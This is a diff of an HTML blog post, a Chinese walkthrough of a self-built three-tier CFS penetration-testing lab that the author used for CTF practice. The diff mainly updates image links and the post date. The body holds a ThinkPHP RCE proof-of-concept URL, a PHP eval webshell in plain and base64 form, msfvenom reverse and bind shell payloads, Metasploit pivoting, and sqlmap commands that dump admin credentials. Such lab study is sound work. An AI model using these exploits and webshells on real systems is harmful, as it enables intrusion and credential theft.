@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS46.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-11-22
                 </div>
                 
 
@@ -475,8 +475,8 @@
 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p>
 <a id="more"></a>
 <p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p>
-<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 1</p>
-<p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 2</p>
+<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS1.png"><br>图 1</p>
+<p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS2.png"><br>图 2</p>
 <p>如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p>
 <blockquote>
 <p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p>
@@ -504,24 +504,24 @@ Network Distance: <span class="token number">1</span> hop
 OS detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
 Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">8.97</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p>
-<p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
+<p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS3.png"><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS4.png"><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS5.png"><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS6.png"><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php @eval(<span class="token variable">$_POST</span>['TeamsSix']);?>"</span> <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS7.png"><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS8.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS9.png"><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS10.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">之前：&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;
 之后：&lt;?php @eval([&#39;TeamsSix&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg=="</span> <span class="token operator">|</span> base64 -d <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS11.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS12.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS13.png"><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS14.png"></p>
 <h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote>
 <p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p>
 </blockquote>
 <p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># ifconfig</span>
 root@kali:~<span class="token comment"># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、在kali中配置运行监听模块</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS15.png"><br>2、在kali中配置运行监听模块</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># msfconsole</span>
 msf5 <span class="token operator">></span> use exploit/multi/handler
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp
@@ -529,45 +529,45 @@ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="to
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">6666</span>
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> options
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS16.png"><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www:/www/wwwroot/ThinkPHP/public<span class="token punctuation">)</span> $ <span class="token function">chmod</span> <span class="token number">777</span> shell.elf
 <span class="token punctuation">(</span>www:/www/wwwroot/ThinkPHP/public<span class="token punctuation">)</span> $ ./shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS17.png"><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute -s <span class="token number">192.168</span>.22.0/24
 run autoroute -p
 
 这一步也可以使用run post/multi/manage/autoroute自动添加路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS18.png"><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/server/socks4a
 msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> srvport <span class="token number">2222</span>
 msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> options
 msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS19.png"><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># vim /etc/proxychains.conf</span>
 加入以下内容：
 socks4 	<span class="token number">192.168</span>.1.113 	<span class="token number">2222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS120.png"><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 nmap -Pn -sT 192.168.22.22</span>
 -Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
 -sT：扫描TCP数据包已建立的连接connect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS21.png"></p>
+<h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS22.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS23.png"><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS24.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS25.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS26.png"><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS27.png"><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、看看bagecms下有哪些表</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS28.png"><br>5、看看bagecms下有哪些表</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、看一下bage_admin下的内容</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS29.png"><br>6、看一下bage_admin下的内容</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS30.png"><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin -C username,password --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS31.png"><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS32.png"><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS33.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS34.png"><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS35.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS36.png"></p>
 <h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf > shell2.elf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
